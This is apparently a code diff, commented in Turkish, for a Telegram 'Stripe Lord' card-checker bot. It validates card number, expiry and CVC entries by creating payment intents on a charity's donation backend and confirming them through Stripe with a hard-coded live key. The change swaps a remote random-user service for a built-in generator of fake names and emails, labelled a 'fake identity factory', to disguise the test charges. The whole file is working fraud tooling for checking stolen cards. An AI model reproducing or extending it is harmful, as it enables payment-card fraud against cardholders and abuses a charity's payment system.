@@ -1,7 +1,7 @@
-# --- DOSYA: main.py (Stripe Lord Bot v2 - Hata Tespiti) ---
-# StripeChecker daha detaylı hata raporu verecek şekilde güncellendi.
+# --- DOSYA: main.py (v34 - Sahte Kimlik Fabrikası) ---
+# randomuser.me bağımlılığı kaldırıldı. Bot artık kendi sahte kimliğini üretiyor.
 
-import logging, requests, time, os, re, json, io
+import logging, requests, time, os, re, json, io, random # random'u ekledik
 from urllib.parse import quote
 from datetime import datetime
 from flask import Flask
@@ -35,6 +35,16 @@ class StripeChecker:
         self.pk_live = "pk_live_B3imPhpDAew8RzuhaKclN4Kd"
         self.donation_url = "https://www-backend.givedirectly.org/payment-intent"
         self.timeout = 30
+        # KENDİ SAHTE KİMLİK FABRİKAMIZ
+        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+
+    def _generate_fake_user(self):
+        """Kendi sahte kullanıcı bilgilerimizi üreten fonksiyon."""
+        first = random.choice(self.first_names)
+        last = random.choice(self.last_names)
+        email = f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@yahoo.com"
+        return first, last, email
 
     def check_card(self, card):
         try:
@@ -42,15 +52,8 @@ class StripeChecker:
             if len(parts) < 4: return "❌ HATA: Eksik kart bilgisi. Format: NUMARA|AY|YIL|CVC"
             ccn, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
 
-            # --- Adım 1: Sahte Kullanıcı Bilgisi Al ---
-            try:
-                user_res = self.session.get("https://randomuser.me/api?nat=us", timeout=10)
-                user_res.raise_for_status()
-                user_data = user_res.json()['results'][0]
-                first_name, last_name = user_data['name']['first'], user_data['name']['last']
-                email = f"{first_name}.{last_name}{time.time()}@yahoo.com"
-            except Exception as e:
-                return f"❌ HATA (Adım 1 - randomuser): {e}"
+            # --- Adım 1: Sahte Kullanıcı Bilgisi Al (ARTIK KENDİ FABRİKAMIZDAN) ---
+            first_name, last_name, email = self._generate_fake_user()
 
             # --- Adım 2: Ödeme Niyeti Oluştur ---
             try:
@@ -70,7 +73,6 @@ class StripeChecker:
                 stripe_url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
                 payload_data = f'payment_method_data[type]=card&payment_method_data[card][number]={ccn}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={month}&payment_method_data[card][exp_year]={year}&payment_method_data[billing_details][name]={first_name}+{last_name}&payment_method_data[billing_details][email]={quote(email)}&client_secret={client_secret}'
                 headers = {'Authorization': f'Bearer {self.pk_live}', 'Content-Type': 'application/x-www-form-urlencoded'}
-                
                 confirm_res = self.session.post(stripe_url, headers=headers, data=payload_data, timeout=self.timeout)
                 confirm_data = confirm_res.json()
             except Exception as e:
@@ -239,7 +241,7 @@ def main():
     keep_alive()
     stripe_checker = StripeChecker()
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Stripe Lord Bot (v2 - Hata Tespiti) aktif...")
+    print("Stripe Lord Bot (v2 - Sahte Kimlik Fabrikası) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.bot_data['stripe_checker'] = stripe_checker
     application.bot_data['user_manager'] = user_manager_instance
